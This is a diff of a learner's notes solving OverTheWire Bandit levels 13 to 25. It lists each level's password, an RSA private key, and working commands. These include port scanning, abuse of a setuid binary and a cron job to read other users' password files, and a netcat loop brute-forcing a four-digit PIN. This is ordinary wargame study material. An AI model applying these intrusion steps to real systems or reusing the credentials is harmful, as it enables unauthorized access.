@@ -1,3 +1,5 @@
+Need help explaining the command of 18-19
+
 0-1: boJ9jbbUNNfktd78OOpsqOltutMc3MY1
 1-2: CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
 2-3: UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
@@ -71,4 +73,153 @@
         change to .gz
         gunzip
         cat -> gave me password
-13-14: 
+13-14: 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+    ssh -i sshkey.private bandit14@localhost
+    -i lets you choose the private key you want to use
+14-15: BfMYroe26WYalil77FoDi9qh59eK5xNr
+    Plan 1: telnet to localhost on port 30000, copy-paste the previous password
+    Actual: success
+15-16: cluFn7wTiGryunymYOu4RcffSxQluehd
+    Plan 1: openssl s_client -connect localhost:30001
+    Actual: Errors HEARTBEATING Read R Block
+    
+    Plan 2: cat /etc/bandit_pass/bandit15 | openssl s_client -connect localhost:30001 -ign_eof
+        -ign_eof ignores eof in input
+    Actual: Success
+16-17: xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
+vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
++TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
+8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
+SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
+HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
+SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
+R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
+Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
+R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
+L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
+blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
+YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----
+
+nmap localhost -p31000-32000 -A
+    -p is port range
+    -A tells you services
+        some ports returned echo, those are incorrect
+        2 didn't, manually test both
+    correct port was 31790
+    cat /etc/bandit_pass/bandit16 | openssl s_client -connect localhost:31790 -ign_eof
+    for private key
+
+    then create dir in tmp
+    vim sshkey.private and paste the rsa key
+    chmod 600 sshkey.private
+    shh -i sshkey.private bandit17@localhost
+    cat /etc/bandit_pass/bandit17
+17-18: kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+    diff password.new password.old
+18-19: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+    login to bandit 0.
+    ssh bandit18@localhost /bin/bash
+    ssh -t bandit18@localhost /bin/bash
+    /bin/bash specifies a command for ssh (command is executed on remote host instead of a login shell)
+    
+    non-interactive shell: shell can't assume that it can request input or someone will see output
+    interactive shell: commands are run with user interaction from the keyboard
+    
+    login: shell is run as part of the login of the user to the system. Usually used to do configuration that a user wants for the env
+    non-login: any shell run after logging on
+19-20: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+    ls -l
+        Noticethat setuid is set, so its run as bandit20
+    ./bandit20-do cat /etc/bandit_pass/bandit20
+        run cat as bandit20 to get the pass for bandit20
+20-21: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+    login to two sessions
+    1: nc -l localhost 7777
+        -l means listen for connects (from the suconnect) rather than try to connect
+    2: ./suconnect 7777
+    1: paste password of 19-20
+21-22: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+    once in /etc/cron.d/
+    cat cronjob_bandit22, see that a script is being run and cat it
+    see that the pass is being put in a file in tmp, cat it
+22-23: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+    cd into cron.d
+    cat cronjob_bandit23
+    see cronjob_bandit23.sh and cat it
+    see that $mytarget is the file name, and re-do the command with bandit23
+    cat /tmp/$mytarget
+23-24: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+    cd into /etc/cron.d
+    cat cronjob_bandit24
+    cat /usr/bin/cronjob_bandit24.sh:
+        #!/bin/bash
+        myname=$(whoami)
+        cd /var/spool/$myname
+        echo "Executing and deleting all scripts in /var/spool/$myname:"
+        for i in * .*;
+        do
+            if [ "$i" != "." -a "$i" != ".." ];
+            then
+                echo "Handling $i"
+                timeout -s 9 60 "./$i"
+                rm -f "./$i"
+            fi
+        done
+
+    cat /etc/bandit_pass/$myname > /tmp/$mytarget
+    whoami is bandit24, so put the script in /var/spool/bandit24
+
+    Want to write a script that will be run by bandit24, that gives bandit23 the password
+    
+    mkdir /tmp/edf23
+    touch pass
+    chmod 666 pass
+    touch 23.sh:
+        #!/bin/bash
+        cat /etc/bandit_pass/bandit24 > /tmp/edf23/pass
+    chmod 777 23.sh
+    cp 23.sh /var/spool/bandit24
+    cat pass
+24-25: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+    #!/bin/bash
+    
+    #prints bandit24's password and 0001 - 9999, one per line
+    function iterate {
+        pass=$(cat /etc/bandit_pass/bandit24)
+        for ((i=0;i<=9999;i++)); do
+             printf "%s %04d\n" "$pass" "$i"
+             #%04d means a 4 digit number             
+        done
+    }
+
+    #iterate
+    
+    #iterate | nc localhost 30002
+    
+    iterate | nc localhost 30002 | grep -v -E "Wrong"
+    # grep -v -E filters out the wrong pin messages
+
+    
+
+
+
+
+
+
+
+        
